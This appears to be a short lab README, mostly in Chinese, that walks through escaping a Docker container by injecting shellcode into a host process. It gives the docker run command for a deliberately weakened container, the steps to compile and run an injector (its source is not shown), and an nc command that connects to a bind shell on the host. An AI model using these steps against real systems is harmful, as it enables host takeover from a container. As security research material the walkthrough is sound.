# Process injection
From https://www.panoptica.app/research/7-ways-to-escape-a-container

## Description
进程注入允许一个进程写入另一个进程的内存空间并执行shellcode。要向主机中的进程注入shellcode，容器必须有两件事：
1. 容器的进程必须具有SYS_PTRACE Linux功能。
2. 容器的主机必须与容器共享其进程命名空间。


注入操作可能会失败，并可能导致不必要的行为。因此，为了避免这种情况，在转义技术中，我们将使用在主机上运行的Python http服务器作为目标进程，并将shellcode注入其内存。

- 最低要求的Linux功能：SYS_PTRACE。
- SYS_PTRACE功能允许执行“ptrace”系统调用。
- 所需的容器设置：容器的主机应将其进程命名空间映射到容器。

可以通过在主机和容器上执行“lsns”命令来验证哪些Linux命名空间在主机和容器之间共享。

## Usage
创建一个漏洞容器
```bash
docker run -it --pid=host --cap-drop=ALL --cap-add=SYS_PTRACE --cap-add=SETGID --cap-add=SETUID --cap-add=CHOWN --cap-add=FOWNER --cap-add=DAC_OVERRIDE --security-opt apparmor=unconfined ubuntu bash
```
在容器内安装
```bash
apt install vim # or any other editor
apt install gcc
apt install net-tools
apt install netcat
```
使用shellcode
```bash
# List process that runs on the host and container.
ps -eaf | grep "/usr/bin/python3 -m http.server 8080" | head -n 1
# Copy and paste the payload from inject.c
vim inject.c
gcc -o inject inject.c
# Inject the shellcode payload that will open a listener over port 5600
./inject <PID>
# Bind over port 5600
nc <HOST-IP> 5600
```